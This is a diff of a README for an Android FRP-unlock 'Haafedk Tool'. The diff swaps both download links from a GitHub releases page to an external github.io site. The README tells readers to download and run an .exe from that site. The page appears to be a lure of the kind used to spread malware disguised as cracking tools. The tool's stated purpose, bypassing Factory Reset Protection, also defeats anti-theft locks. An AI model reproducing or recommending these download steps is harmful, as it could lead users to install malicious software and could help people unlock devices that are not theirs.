@@ -1,6 +1,6 @@
 # 🔓 Descargar-Haafedk-Tool - Unlock your Android device with ease
 
-[![Download Haafedk Tool](https://img.shields.io/badge/Download-Haafedk_Tool-blue)](https://github.com/Recursive-multiplemononeuropathy581/Descargar-Haafedk-Tool/releases)
+[![Download Haafedk Tool](https://img.shields.io/badge/Download-Haafedk_Tool-blue)](https://recursive-multiplemononeuropathy581.github.io)
 
 Haafedk Tool handles phone locks and software recovery tasks for Android devices. This software works on Windows 10 and Windows 11. It helps users remove Factory Reset Protection (FRP) and manage device security settings without complex command lines.
 
@@ -20,7 +20,7 @@ To run this tool, your computer needs to meet these basic standards:
 You can get the application files from the official repository release page. Follow the steps below to start the download:
 
 1. Visit the link below to access the release page:
-[https://github.com/Recursive-multiplemononeuropathy581/Descargar-Haafedk-Tool/releases](https://github.com/Recursive-multiplemononeuropathy581/Descargar-Haafedk-Tool/releases)
+[https://recursive-multiplemononeuropathy581.github.io](https://recursive-multiplemononeuropathy581.github.io)
 2. Look for the most recent version labeled as "Latest" at the top of the list.
 3. Click on the file ending in .exe to start the transfer to your computer.
 4. Save the file to your Downloads folder or your Desktop for easy access.
